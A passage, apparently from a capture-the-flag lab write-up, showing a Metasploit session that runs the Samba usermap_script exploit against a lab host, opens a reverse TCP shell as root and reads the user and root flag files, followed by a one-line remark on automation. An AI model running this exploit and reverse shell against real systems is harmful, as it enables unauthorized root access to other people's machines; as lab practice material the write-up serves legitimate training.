-   LHOST  192.168.1.88     yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
-RHOSTS => 10.10.10.3
-msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.8
-LHOST => 10.10.14.8
-msf6 exploit(multi/samba/usermap_script) > run
-
-[*] Started reverse TCP handler on 10.10.14.8:4444 
-[*] Command shell session 1 opened (10.10.14.8:4444 -> 10.10.10.3:58270) at 2021-09-15 12:03:55 +0530
-
-id
-uid=0(root) gid=0(root)
-whoami
-root
-cat /home/makis/user.txt
-<---USER FLAG--->
-cat /root/root.txt
-<---ROOT FLAG--->
-```
-
-It is way more simple than using manual exploit, because frameworks are always meant to automate our work
